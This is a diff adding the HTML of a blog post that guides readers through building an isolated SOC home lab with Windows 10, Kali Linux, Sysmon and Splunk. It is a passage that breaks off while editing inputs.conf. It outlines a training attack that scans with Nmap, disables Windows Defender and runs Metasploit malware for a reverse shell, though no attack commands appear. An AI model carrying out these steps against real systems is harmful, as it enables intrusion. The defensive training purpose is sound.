@@ -1,0 +1,1241 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <script type="application/javascript" src='http://localhost:1313/js/theme-mode.js'></script>
+    <link rel="stylesheet" href='http://localhost:1313/css/frameworks.min.css' />
+    <link rel="stylesheet" href='http://localhost:1313/css/github.min.css' />
+    <link rel="stylesheet" href='http://localhost:1313/css/github-style.css' />
+    <link rel="stylesheet" href='http://localhost:1313/css/light.css' />
+    <link rel="stylesheet" href='http://localhost:1313/css/dark.css' />
+    <link rel="stylesheet" href='http://localhost:1313/css/syntax.css' />
+    <title>Building Your Own Soc Lab - Peter Wambua&#39;s blog</title>
+    
+    <link rel="icon" type="image/x-icon" href='http://localhost:1313/images/favicon.ico'>
+    
+    <meta name="theme-color" content="#1e2327">
+
+    
+    
+
+    
+    <meta name="description"
+  content="🧪 Build Your Own SOC Home Lab: Step-by-Step Guide ✅ Overview
+This comprehensive guide of how I set up my SOC home lab, and I have written it to guide you through setting up a fully functional Security Operations Center (SOC) home lab, compatible with both VirtualBox and VMware Workstation. You&amp;rsquo;ll build a safe, isolated environment using Windows 10, Kali Linux, Sysmon, and Splunk to simulate real-world attacker–defender scenarios.
+📑 Index Click any section below to jump to it:" />
+<meta name="keywords"
+  content='' />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="http://localhost:1313/post/building-your-own-soc-lab/" />
+
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="Building Your Own Soc Lab - Peter Wambua&#39;s blog" />
+<meta name="twitter:description"
+  content="🧪 Build Your Own SOC Home Lab: Step-by-Step Guide ✅ Overview
+This comprehensive guide of how I set up my SOC home lab, and I have written it to guide you through setting up a fully functional Security Operations Center (SOC) home lab, compatible with both VirtualBox and VMware Workstation. You&amp;rsquo;ll build a safe, isolated environment using Windows 10, Kali Linux, Sysmon, and Splunk to simulate real-world attacker–defender scenarios.
+📑 Index Click any section below to jump to it:" />
+<meta name="twitter:site" content="http://localhost:1313/" />
+<meta name="twitter:creator" content="" />
+<meta name="twitter:image"
+  content="http://localhost:1313/">
+
+
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Building Your Own Soc Lab - Peter Wambua&#39;s blog">
+<meta property="og:description"
+  content="🧪 Build Your Own SOC Home Lab: Step-by-Step Guide ✅ Overview
+This comprehensive guide of how I set up my SOC home lab, and I have written it to guide you through setting up a fully functional Security Operations Center (SOC) home lab, compatible with both VirtualBox and VMware Workstation. You&amp;rsquo;ll build a safe, isolated environment using Windows 10, Kali Linux, Sysmon, and Splunk to simulate real-world attacker–defender scenarios.
+📑 Index Click any section below to jump to it:" />
+<meta property="og:url" content="http://localhost:1313/post/building-your-own-soc-lab/" />
+<meta property="og:site_name" content="Building Your Own Soc Lab" />
+<meta property="og:image"
+  content="http://localhost:1313/">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+<meta property="article:published_time" content="2025-07-14 16:04:10 -0400 EDT" />
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+
+<body>
+  <div style="position: relative">
+  <header class="Header js-details-container Details px-3 px-md-4 px-lg-5 flex-wrap flex-md-nowrap open Details--on">
+    <div class="Header-item mobile-none" style="margin-top: -4px; margin-bottom: -4px;">
+      <a class="Header-link" href="http://localhost:1313/">
+        <img class="octicon" height="32" width="32" src="">
+      </a>
+    </div>
+    <div class="Header-item d-md-none">
+      <button class="Header-link btn-link js-details-target" type="button"
+        onclick="document.querySelector('#header-search').style.display = document.querySelector('#header-search').style.display == 'none'? 'block': 'none'">
+        <svg height="24" class="octicon octicon-three-bars" viewBox="0 0 16 16" version="1.1" width="24">
+          <path fill-rule="evenodd" d="M1 2.75A.75.75 0 011.75 2h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 2.75zm0 5A.75.75 0 011.75 7h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 7.75zM1.75 12a.75.75 0 100 1.5h12.5a.75.75 0 100-1.5H1.75z">
+          </path>
+        </svg>
+      </button>
+    </div>
+    <div style="display: none;" id="header-search"
+      class="Header-item Header-item--full flex-column flex-md-row width-full flex-order-2 flex-md-order-none mr-0 mr-md-3 mt-3 mt-md-0 Details-content--hidden-not-important d-md-flex">
+      <div
+        class="Header-search header-search flex-auto js-site-search position-relative flex-self-stretch flex-md-self-auto mb-3 mb-md-0 mr-0 mr-md-3 scoped-search site-scoped-search js-jump-to">
+        <div class="position-relative">
+          
+          <form target="_blank" action="https://www.google.com/search" accept-charset="UTF-8" method="get"
+            autocomplete="off">
+            <label
+              class="Header-search-label form-control input-sm header-search-wrapper p-0 js-chromeless-input-container header-search-wrapper-jump-to position-relative d-flex flex-justify-between flex-items-center">
+              <input type="text"
+                class="Header-search-input form-control input-sm header-search-input jump-to-field js-jump-to-field js-site-search-focus js-site-search-field is-clearable"
+                name="q" value="" placeholder="Search" autocomplete="off">
+              <input type="hidden" name="q" value="site:http://localhost:1313/">
+            </label>
+          </form>
+          
+        </div>
+      </div>
+    </div>
+
+    <div class="Header-item Header-item--full flex-justify-center d-md-none position-relative">
+      <a class="Header-link " href="http://localhost:1313/">
+        <img class="octicon octicon-mark-github v-align-middle" height="32" width="32" src="">
+      </a>
+    </div>
+    <div class="Header-item" style="margin-right: 0;">
+      <a href="javascript:void(0)" class="Header-link no-select" onclick="switchTheme()">
+        <svg style="fill: var(--color-profile-color-modes-toggle-moon);" class="no-select" viewBox="0 0 16 16"
+          version="1.1" width="16" height="16">
+          <path fill-rule="evenodd" clip-rule="evenodd"
+            d="M4.52208 7.71754C7.5782 7.71754 10.0557 5.24006 10.0557 2.18394C10.0557 1.93498 10.0392 1.68986 10.0074 1.44961C9.95801 1.07727 10.3495 0.771159 10.6474 0.99992C12.1153 2.12716 13.0615 3.89999 13.0615 5.89383C13.0615 9.29958 10.3006 12.0605 6.89485 12.0605C3.95334 12.0605 1.49286 10.001 0.876728 7.24527C0.794841 6.87902 1.23668 6.65289 1.55321 6.85451C2.41106 7.40095 3.4296 7.71754 4.52208 7.71754Z">
+          </path>
+        </svg>
+      </a>
+    </div>
+  </header>
+</div>
+
+  <div id="search-result" class="container-lg px-3 new-discussion-timeline" style="display: none;">
+</div>
+
+  
+<div class="application-main">
+  <div>
+  <main>
+    <div class="gisthead pagehead bg-gray-light pb-0 pt-3 mb-4">
+      <div class="px-0">
+        <div class="mb-3 d-flex px-3 px-md-3 px-lg-5">
+          <div class="flex-auto min-width-0 width-fit mr-3">
+            <div class="d-flex">
+              <div class="d-none d-md-block">
+                <a class="avatar mr-2 flex-shrink-0" href="http://localhost:1313/">
+                  <img class=" avatar-user"
+                    src="/images/profile.png"
+                    width="32" height="32"></a>
+              </div>
+              <div class="d-flex flex-column">
+                <h1 class="break-word f3 text-normal mb-md-0 mb-1">
+                  <span class="author">
+                    <a href="http://localhost:1313/">Peter Wambua</a>
+                  </span>
+                  <span class="path-divider">/</span>
+                  <strong class="css-truncate css-truncate-target mr-1" style="max-width: 410px">
+                    <a href="http://localhost:1313/post/building-your-own-soc-lab/">Building Your Own Soc Lab</a>
+                  </strong>
+                </h1>
+                <div class="note m-0">
+                  Created <relative-time datetime="Mon, 14 Jul 2025 16:04:10 -0400"
+                    class="no-wrap">
+                    Mon, 14 Jul 2025 16:04:10 -0400</relative-time>
+
+                  
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="container-lg px-3 new-discussion-timeline">
+      <div class="repository-content gist-content">
+        <div>
+          <div class="js-gist-file-update-container js-task-list-container file-box">
+            <div id="file-pytest" class="file my-2">
+              <div id="post-header" class="file-header d-flex flex-md-items-center flex-items-start sticky-header" style="z-index: 2">
+                <div class="file-info d-flex flex-md-items-center flex-items-start flex-order-1 flex-auto">
+                  <div class="text-mono f6 flex-auto pr-3 flex-order-2 flex-md-order-1 mt-2 mt-md-0">
+                    
+                    <summary id="toc-toggle" onclick="clickToc()" class="btn btn-octicon m-0 mr-2 p-2">
+                      <svg aria-hidden="true" viewBox="0 0 16 16" height="16" width="16" class="octicon octicon-list-unordered">
+                        <path fill-rule="evenodd" d="M2 4a1 1 0 100-2 1 1 0 000 2zm3.75-1.5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zM3 8a1 1 0 11-2 0 1 1 0 012 0zm-1 6a1 1 0 100-2 1 1 0 000 2z"></path>
+                      </svg>
+                    </summary>
+                    <details-menu class="SelectMenu" id="toc-details" style="display: none;">
+                      <div class="SelectMenu-modal rounded-3 mt-1" style="max-height: 340px;">
+                        <div class="SelectMenu-list SelectMenu-list--borderless p-2" style="overscroll-behavior: contain;" id="toc-list">
+                        </div>
+                      </div>
+                    </details-menu>
+                      3045 Words
+                    
+
+                  </div>
+                  <div class="file-actions flex-order-2 pt-0">
+                    
+                  </div>
+                </div>
+              </div>
+
+
+              <div class="Box-body px-5 pb-5" style="z-index: 1">
+                <article class="markdown-body entry-content container-lg"><h1 id="-build-your-own-soc-home-lab-step-by-step-guide">🧪 Build Your Own SOC Home Lab: Step-by-Step Guide</h1>
+<blockquote>
+<p>✅ <strong>Overview</strong><br>
+This comprehensive guide of how I set up my SOC home lab, and I have written it to guide you through setting up a fully functional Security Operations Center (SOC) home lab, compatible with both VirtualBox and VMware Workstation. You&rsquo;ll build a safe, isolated environment using Windows 10, Kali Linux, Sysmon, and Splunk to simulate real-world attacker–defender scenarios.</p>
+</blockquote>
+<h2 id="-index">📑 Index</h2>
+<p>Click any section below to jump to it:</p>
+<ol>
+<li><a href="#1-prerequisites">Prerequisites</a></li>
+<li><a href="#2-install-virtualbox">Install VirtualBox</a></li>
+<li><a href="#3-plan-your-lab-setup">Plan Your Lab Setup</a></li>
+<li><a href="#4-get-a-windows-10-iso-image">Get a Windows 10 ISO Image</a></li>
+<li><a href="#5-set-up-the-windows-10-virtual-machine">Set Up the Windows 10 Virtual Machine</a></li>
+<li><a href="#6-install-windows-10">Install Windows 10</a></li>
+<li><a href="#7-install-kali-linux">Install Kali Linux</a></li>
+<li><a href="#8-installing-sysmon-and-splunk-before-isolation">Installing Sysmon and Splunk Before Isolation</a></li>
+<li><a href="#9-configuring-virtual-machine-networking-securely">Configuring Virtual Machine Networking Securely</a></li>
+<li><a href="#10-malware-analysis-configuration-recommended">Malware Analysis Configuration Recommended</a></li>
+<li><a href="#11-step-by-step-configuration-in-virtualbox">Step-by-Step Configuration in VirtualBox</a></li>
+<li><a href="#12-equivalent-setup-in-vmware-workstation">Equivalent Setup in VMware Workstation</a></li>
+<li><a href="#13-configure-inputsconf-to-ingest-sysmon-logs">Configure inputs.conf to Ingest Sysmon Logs</a></li>
+<li><a href="#14-malware-generation-and-handler-setup-using-metasploit">Malware Generation and Handler Setup Using Metasploit</a></li>
+<li><a href="#15-investigating-attack-activity-in-splunk">Investigating Attack Activity in Splunk</a></li>
+</ol>
+<h2 id="1-prerequisites">1 Prerequisites</h2>
+<p>Ensure you have the following components prepared before beginning the SOC home lab setup:</p>
+<table>
+<thead>
+<tr>
+<th>Component</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Memory (RAM)</td>
+<td>At least 16 GB recommended for stable performance with multiple VMs</td>
+</tr>
+<tr>
+<td>Virtualization Software</td>
+<td>VirtualBox or VMware Workstation to create and manage virtual machines</td>
+</tr>
+<tr>
+<td>Operating System ISOs</td>
+<td>Official ISO files for Windows 10 and Kali Linux</td>
+</tr>
+<tr>
+<td>Security Tools</td>
+<td>Splunk and Sysmon installers for log collection and analysis</td>
+</tr>
+<tr>
+<td>Internet Connection</td>
+<td>Required for downloading tools, updates, and initial configuration</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="2-install-virtualbox">2 Install VirtualBox</h2>
+<ol>
+<li>
+<p>Visit <a href="https://www.virtualbox.org">https://www.virtualbox.org</a>.</p>
+</li>
+<li>
+<p>Download the latest version of <strong>VirtualBox</strong> for your OS.</p>
+</li>
+<li>
+<p>Run the installer and complete the installation.</p>
+<ul>
+<li>If you encounter errors related to missing dependencies (especially on Linux), follow the prompts or install the required packages manually.</li>
+</ul>
+</li>
+</ol>
+<p>💡 <strong>Tip:</strong> If your <strong>C: drive</strong> has low storage, you can save VMs to another drive like <strong>D:/</strong> or <strong>E:/</strong>.</p>
+<hr>
+<h2 id="3-plan-your-lab-setup">3 Plan Your Lab Setup</h2>
+<p>We’ll create a simulated environment using virtual machines:</p>
+<ul>
+<li>
+<p><strong>Windows 10</strong> — main machine (target/victim), will run <strong>Sysmon</strong> and <strong>Splunk</strong>.</p>
+</li>
+<li>
+<p><strong>Kali Linux</strong> — attacker machine for simulating threats.</p>
+</li>
+</ul>
+<p>Feel free to customize with more machines (like Ubuntu for ELK stack, Security Onion, etc.) as your system allows.</p>
+<hr>
+<h2 id="4-get-a-windows-10-iso-image">4 Get a Windows 10 ISO Image</h2>
+<p>There are several ways to install Windows 10, including using third-party ISO files or pre-made images. However, <strong>creating your own Windows ISO image using Microsoft&rsquo;s official tool is one of the safest and most reliable methods</strong>.</p>
+<h3 id="-link">🔗 Link:</h3>
+<p><a href="https://www.microsoft.com/en-ca/softwaredownload/windows10">https://www.microsoft.com/en-ca/softwaredownload/windows10</a></p>
+<blockquote>
+<p>⚠️ <strong>Note:</strong> You’ll need a <strong>valid license key</strong> to activate Windows 10 later.</p>
+</blockquote>
+<h3 id="-steps">📥 Steps:</h3>
+<ol>
+<li>
+<p>Click <strong>Download tool now</strong>.</p>
+</li>
+<li>
+<p>Run the downloaded <strong>MediaCreationTool</strong>.</p>
+</li>
+<li>
+<p>Accept the license terms.</p>
+</li>
+<li>
+<p>Select:</p>
+<ul>
+<li>
+<p>✅ <strong>Create installation media (USB flash drive, DVD, or ISO file) for another PC</strong></p>
+</li>
+<li>
+<p>Click <strong>Next</strong></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Choose language, edition, and architecture, or leave <strong>&ldquo;Use the recommended options&rdquo;</strong> checked.</p>
+</li>
+<li>
+<p>Select <strong>ISO file</strong> as the output format.</p>
+</li>
+<li>
+<p>Save the ISO file to your preferred location.</p>
+</li>
+</ol>
+<hr>
+<h2 id="5-set-up-the-windows-10-virtual-machine">5 Set Up the Windows 10 Virtual Machine</h2>
+<ol>
+<li>
+<p>Open <strong>VirtualBox</strong>, click <strong>New</strong>.</p>
+</li>
+<li>
+<p>Enter name: <code>Windows 10</code>.</p>
+</li>
+<li>
+<p>Select the <strong>ISO image</strong> you just created.</p>
+</li>
+<li>
+<p><strong>Skip unattended installation</strong> to install the OS manually (optional).</p>
+</li>
+<li>
+<p>Assign resources:</p>
+<ul>
+<li>
+<p>RAM: at least 2–4 GB (more if you can)</p>
+</li>
+<li>
+<p>CPU: Minimum <strong>1 core</strong>, <strong>2 cores recommended</strong> for smoother performance</p>
+</li>
+</ul>
+</li>
+<li>
+<p>Keep virtual hard disk settings as default (dynamically allocated is fine).</p>
+</li>
+<li>
+<p>Review settings and click <strong>Finish</strong>.</p>
+</li>
+<li>
+<p>Power on the VM.</p>
+</li>
+</ol>
+<hr>
+<h2 id="6-install-windows-10">6 Install Windows 10</h2>
+<ol>
+<li>
+<p>Choose language, region, and keyboard layout.</p>
+</li>
+<li>
+<p>When asked for a product key, click <strong>“I don’t have a product key”</strong>.</p>
+</li>
+<li>
+<p>Select the edition to install (e.g., <strong>Windows 10 Pro</strong>).</p>
+</li>
+<li>
+<p>Accept the license agreement.</p>
+</li>
+<li>
+<p>Choose <strong>“Custom: Install Windows only (advanced)”</strong>.</p>
+</li>
+<li>
+<p>Select the virtual disk and click <strong>Next</strong>.</p>
+</li>
+</ol>
+<p>Windows will now begin installation.</p>
+<hr>
+<h2 id="7-install-kali-linux">7 Install Kali Linux</h2>
+<p>Download the official Kali Linux virtual machine image for easy import into VirtualBox.</p>
+<h3 id="-link-1">🔗 Link:</h3>
+<p><a href="https://www.kali.org/get-kali/#kali-virtual-machines">https://www.kali.org/get-kali/#kali-virtual-machines</a></p>
+<h3 id="you-have-two-options">You have two options:</h3>
+<ul>
+<li>
+<p>✅ <strong>Pre-built VM</strong> (quickest, recommended)</p>
+</li>
+<li>
+<p>🔧 <strong>Manual install via ISO</strong> (similar to Windows install)</p>
+</li>
+</ul>
+<p>Once downloaded:</p>
+<ol>
+<li>
+<p>Extract the <code>.ova</code> file if needed.</p>
+</li>
+<li>
+<p>Open VirtualBox → File → Import Appliance.</p>
+</li>
+<li>
+<p>Import the Kali Linux VM and power it on.</p>
+</li>
+</ol>
+<hr>
+<h2 id="8-installing-sysmon-and-splunk-before-isolation">8 Installing Sysmon and Splunk Before Isolation</h2>
+<p>Once you&rsquo;ve set up the internal network and isolated the virtual machines, they will no longer have internet access. Therefore, make sure you complete the installations of <strong>Sysmon</strong> and <strong>Splunk</strong> while the network is still in <strong>NAT mode</strong> (the default setting). Once this is done, you can proceed to network isolation safely.</p>
+<p>To recap:</p>
+<ul>
+<li>
+<p><strong>Objective</strong>: The goal is to generate telemetry on the Windows target machine so you can detect attacker behavior.</p>
+</li>
+<li>
+<p>We’ll simulate a basic attack workflow:</p>
+<ol>
+<li>
+<p>Use <strong>Nmap</strong> from Kali to scan for open ports on the Windows machine.</p>
+</li>
+<li>
+<p>Disable <strong>Windows Defender</strong>.</p>
+</li>
+<li>
+<p>Execute a custom malware to establish a <strong>reverse TCP shell</strong>.</p>
+</li>
+</ol>
+</li>
+<li>
+<p>Then observe what <strong>telemetry</strong> (logs and events) are generated using <strong>Sysmon</strong> and <strong>Splunk</strong>.</p>
+</li>
+</ul>
+<h3 id="-tool-installation-windows-vm">🔧 Tool Installation (Windows VM)</h3>
+<ul>
+<li>
+<p><strong>Install Splunk Enterprise</strong></p>
+<ul>
+<li>
+<p>Go to: <a href="https://www.splunk.com">https://www.splunk.com</a></p>
+</li>
+<li>
+<p>Download and install <strong>Splunk Enterprise</strong> on your Windows VM.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Install Sysmon</strong></p>
+<ul>
+<li>
+<p>Download from Microsoft: <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon">Sysmon</a></p>
+</li>
+<li>
+<p>Download Olaf Hartong’s configuration (💡 Big thanks to Olaf Hartong for his outstanding work on Sysmon Modular – this configuration makes deep endpoint visibility much more accessible.) file: <a href="https://github.com/olafhartong/sysmon-modular/blob/master/sysmonconfig.xml">sysmonconfig.xml</a></p>
+</li>
+<li>
+<p>Right-click the config link → <strong>Save As</strong> → <code>sysmonconfig.xml</code></p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Set Up Sysmon</strong></p>
+<ol>
+<li>
+<p>Extract the downloaded Sysmon zip.</p>
+</li>
+<li>
+<p>Open <strong>PowerShell as Administrator</strong>.</p>
+</li>
+<li>
+<p><code>cd</code> to the directory containing both <code>sysmon64.exe</code> and <code>sysmonconfig.xml</code>.</p>
+</li>
+<li>
+<p>Run:</p>
+<pre tabindex="0"><code>.\Sysmon64.exe -i .\sysmonconfig.xml
+</code></pre></li>
+<li>
+<p>Accept license terms when prompted.</p>
+</li>
+</ol>
+</li>
+<li>
+<p><strong>Verify Sysmon Installation</strong></p>
+<ul>
+<li>
+<p>Open <strong>Services</strong>, search for <strong>Sysmon</strong>.</p>
+</li>
+<li>
+<p>Alternatively, use <strong>Event Viewer</strong> → <code>Applications and Services Logs</code> → <code>Microsoft</code> → <code>Windows</code> → check for <strong>Sysmon</strong>.</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>💡 Tip: If you&rsquo;re new to Splunk, check out the <strong>Splunk Fundamentals 1</strong> course (free): 🔗 <a href="https://www.splunk.com/en_us/training/splunk-fundamentals.html">https://www.splunk.com/en_us/training/splunk-fundamentals.html</a></p>
+<hr>
+<h2 id="9-configuring-virtual-machine-networking-securely">9 Configuring Virtual Machine Networking Securely</h2>
+<p>When setting up virtual machines, default settings are usually fine for general use. However, if you&rsquo;re planning to analyze <strong>malware or potentially harmful software</strong>, using default networking configurations may put your <strong>host machine at risk</strong>.</p>
+<p>This guide primarily uses <strong>VirtualBox</strong>, but instructions for <strong>VMware Workstation</strong> are also provided for users who prefer that platform.</p>
+<h3 id="-how-to-reduce-the-risk">🛡️ How to Reduce the Risk?</h3>
+<p>To minimize the chance of infecting your host system during malware analysis, the key area to focus on is <strong>network configuration</strong>.</p>
+<p>In <strong>VirtualBox</strong>, you can adjust this by:</p>
+<ul>
+<li>
+<p>Selecting your VM</p>
+</li>
+<li>
+<p>Clicking <strong>Settings → Network</strong></p>
+</li>
+<li>
+<p>Changing the <strong>&ldquo;Attached to:&rdquo;</strong> dropdown under the <strong>Adapter 1</strong> tab</p>
+</li>
+</ul>
+<p>You’ll see several network options. Here&rsquo;s a brief explanation of each:</p>
+<table>
+<thead>
+<tr>
+<th>Network Mode</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>NAT (default)</strong></td>
+<td>VM accesses external network (internet) through the host. Safe and good for general use, but not ideal for malware analysis.</td>
+</tr>
+<tr>
+<td><strong>Bridged Adapter</strong></td>
+<td>VM connects directly to the same network as the host. It behaves like a physical machine on the same LAN. Not recommended for malware testing.</td>
+</tr>
+<tr>
+<td><strong>Internal Network</strong></td>
+<td>Only VMs on the same internal network can communicate with each other. No internet or host access. Safer for malware isolation.</td>
+</tr>
+<tr>
+<td><strong>Host-only Adapter</strong></td>
+<td>Allows VM to communicate only with the host and other host-only VMs. No external internet. Great for analysis and containment.</td>
+</tr>
+<tr>
+<td><strong>Generic Driver</strong></td>
+<td>Advanced option requiring custom drivers—rarely used and generally unnecessary.</td>
+</tr>
+<tr>
+<td><strong>NAT Network</strong></td>
+<td>Similar to NAT, but allows multiple VMs to communicate with each other behind a shared NAT. Useful for isolated multi-VM setups.</td>
+</tr>
+<tr>
+<td><strong>Cloud Network (Experimental)</strong></td>
+<td>Integrates with Oracle Cloud. Not stable or recommended for general use.</td>
+</tr>
+<tr>
+<td><strong>Not Attached</strong></td>
+<td>The VM has no network connection at all. Completely isolated—most secure for analyzing malware.</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>✅ <strong>Reminder</strong>: For malware analysis, use <strong>&ldquo;Host-only Adapter&rdquo;</strong>, <strong>&ldquo;Internal Network&rdquo;</strong>, or <strong>&ldquo;Not Attached&rdquo;</strong> to reduce exposure to your host and external networks.</p>
+</blockquote>
+<hr>
+<h2 id="10-malware-analysis-configuration-recommended">10 Malware Analysis Configuration (Recommended)</h2>
+<p>When analyzing malware, it’s essential to isolate the virtual machines from the internet and your host system. The <strong>Internal Network</strong> option is ideal in this case. This mode places your virtual machines in a completely separate network with <strong>no internet access</strong> or LAN access. You’ll need to <strong>manually assign IP addresses</strong> for each VM.</p>
+<h3 id="-note">❗ Note:</h3>
+<p>Avoid using <strong>Generic Driver</strong> or <strong>Cloud Network</strong> unless you&rsquo;re confident about their configurations. They are rarely used and not recommended for malware labs.</p>
+<hr>
+<h2 id="11-step-by-step-configuration-in-virtualbox">11 Step-by-Step Configuration in VirtualBox</h2>
+<h3 id="step-1-configure-internal-network">Step 1: Configure Internal Network</h3>
+<p>Configure both Windows and Kali Linux VMs to be on the same isolated internal network:</p>
+<ul>
+<li>
+<p><strong>Windows 10</strong>:</p>
+<ul>
+<li>
+<p>Go to <code>Settings → Network</code></p>
+</li>
+<li>
+<p>Set <code>Attached to: Internal Network</code></p>
+</li>
+<li>
+<p>Name: <code>test</code></p>
+</li>
+<li>
+<p>Click OK</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Kali Linux</strong>:</p>
+<ul>
+<li>
+<p>Go to <code>Settings → Network</code></p>
+</li>
+<li>
+<p>Set <code>Attached to: Internal Network</code></p>
+</li>
+<li>
+<p>Name: <code>test</code></p>
+</li>
+<li>
+<p>Click OK</p>
+</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>✅ <strong>Reminder</strong>: Ensure both VMs use the exact same network name (<code>test</code>) so they can communicate.</p>
+</blockquote>
+<hr>
+<h3 id="step-2-assign-static-ip-addresses">Step 2: Assign Static IP Addresses</h3>
+<p>Since the Internal Network has no DHCP server, you need to assign static IPs manually.</p>
+<h4 id="-on-windows-10">🪟 On Windows 10:</h4>
+<ul>
+<li>
+<p>Boot the VM</p>
+</li>
+<li>
+<p>Right-click the globe icon in the system tray → <strong>Open Network &amp; Internet Settings</strong></p>
+</li>
+<li>
+<p>Click <strong>Change adapter options</strong></p>
+</li>
+<li>
+<p>Right-click the Ethernet adapter → <strong>Properties</strong></p>
+</li>
+<li>
+<p>Select <strong>Internet Protocol Version 4 (TCP/IPv4)</strong> → <strong>Properties</strong></p>
+</li>
+<li>
+<p>Select <strong>Use the following IP address</strong></p>
+</li>
+<li>
+<p>IP Address: <code>192.168.20.10</code></p>
+</li>
+<li>
+<p>Click OK</p>
+</li>
+</ul>
+<p>✅ Now open <strong>CMD</strong> and type <code>ipconfig</code> to verify the assigned IP.</p>
+<h4 id="-on-kali-linux">🐱‍💻 On Kali Linux:</h4>
+<ul>
+<li>
+<p>Boot the VM</p>
+</li>
+<li>
+<p>Click the Ethernet icon (top right corner)</p>
+</li>
+<li>
+<p>Select <strong>Edit Connections</strong> → Choose the wired connection</p>
+</li>
+<li>
+<p>Click the ⚙️ (gear) icon → Go to <strong>IPv4 Settings</strong></p>
+</li>
+<li>
+<p>Set Method to <code>Manual</code></p>
+</li>
+<li>
+<p>Click <strong>Add</strong> under Addresses:</p>
+<ul>
+<li>
+<p>IP Address: <code>192.168.20.11</code></p>
+</li>
+<li>
+<p>Netmask: <code>24</code></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Click <strong>Save</strong></p>
+</li>
+</ul>
+<p>✅ Open a terminal and run <code>ifconfig</code> to confirm the IP.</p>
+<hr>
+<h3 id="step-3-test-connectivity">Step 3: Test Connectivity</h3>
+<p>To test communication between the two VMs:</p>
+<ul>
+<li>
+<p>From <strong>Kali</strong>: Run <code>ping 192.168.20.10</code></p>
+<ul>
+<li>This might fail initially because Windows blocks inbound ICMP traffic by default.</li>
+</ul>
+</li>
+<li>
+<p>From <strong>Windows CMD</strong>: Run <code>ping 192.168.20.11</code></p>
+<ul>
+<li>This should work, confirming successful connectivity.</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="-final-step-take-snapshots">📸 Final Step: Take Snapshots</h3>
+<p>Once everything is configured and working:</p>
+<ul>
+<li>
+<p>Take a <strong>snapshot</strong> of both Windows and Kali VMs</p>
+</li>
+<li>
+<p>This allows you to revert to a clean state if anything goes wrong</p>
+</li>
+</ul>
+<hr>
+<h2 id="12-equivalent-setup-in-vmware-workstation">12 Equivalent Setup in VMware Workstation</h2>
+<p>If you&rsquo;re using <strong>VMware Workstation</strong>, the concept is similar but the naming is different.</p>
+<h3 id="step-by-step">Step-by-Step:</h3>
+<ol>
+<li>
+<p>In VMware, go to the <strong>top menu</strong> → <code>VM → Settings</code> <em>(or press Ctrl + D)</em></p>
+</li>
+<li>
+<p>Navigate to <strong>Network Adapter</strong></p>
+</li>
+<li>
+<p>Instead of &ldquo;Internal Network&rdquo; (used in VirtualBox), VMware uses <strong>LAN Segment</strong> for isolated networking</p>
+</li>
+<li>
+<p>Click the <strong>LAN Segments</strong> button → <strong>Add</strong> → Name it: <code>test</code> → Click OK</p>
+</li>
+<li>
+<p>Now set <strong>LAN Segment</strong> as the network type and select the <code>test</code> segment from the dropdown</p>
+</li>
+<li>
+<p>Click OK</p>
+</li>
+</ol>
+<p>Just like in VirtualBox, you’ll need to <strong>assign static IPs manually</strong> in each VM to ensure they’re on the same subnet.</p>
+<p>Now you&rsquo;re ready to safely analyze malware in an isolated environment using either VirtualBox or VMware.</p>
+<h2 id="13-configure-inputsconf-to-ingest-sysmon-logs">13 Configure <code>inputs.conf</code> to Ingest Sysmon Logs</h2>
+<p>Head back to your <strong>Windows VM</strong> and navigate to the following path:</p>
+<pre tabindex="0"><code>C:\Program Files\Splunk\etc\system\local
+</code></pre><h4 id="if-inputsconf-does-not-exist">If <code>inputs.conf</code> does <strong>not</strong> exist:</h4>
+<ol>
+<li>
+<p>Go to:</p>
+<pre tabindex="0"><code>C:\Program Files\Splunk\etc\system\default
+</code></pre></li>
+<li>
+<p>Copy the file <code>inputs.conf</code></p>
+</li>
+<li>
+<p>Paste it into the <code>local</code> folder:</p>
+<pre tabindex="0"><code>C:\Program Files\Splunk\etc\system\local
+</code></pre></li>
+</ol>
+<hr>
+<h4 id="-replace-the-contents-of-inputsconf">📝 Replace the Contents of <code>inputs.conf</code></h4>
+<ol>
+<li>
+<p>Open the local <code>inputs.conf</code> file in a text editor (like Notepad).</p>
+</li>
+<li>
+<p><strong>Delete all existing content</strong> in the file.</p>
+</li>
+<li>
+<p><strong>Paste the following content</strong> into the file:</p>
+</li>
+</ol>
+<pre tabindex="0"><code>#   Version 9.1.1
+# DO NOT EDIT THIS FILE!
+# Changes to default files will be lost on update and are difficult to
+# manage and support.
+#
+# Please make any changes to system defaults by overriding them in
+# apps or $SPLUNK_HOME/etc/system/local  
+# (See &#34;Configuration file precedence&#34; in the web documentation).
+#
+# To override a specific setting, copy the name of the stanza and
+# setting to the file where you wish to override it.
+#
+# This file contains possible attributes and values you can use to
+# configure inputs, distributed inputs and file system monitoring.
+
+
+[default]
+index         = default
+_rcvbuf        = 1572864
+host = $decideOnStartup
+evt_resolve_ad_obj = 0
+evt_dc_name=
+evt_dns_name=
+
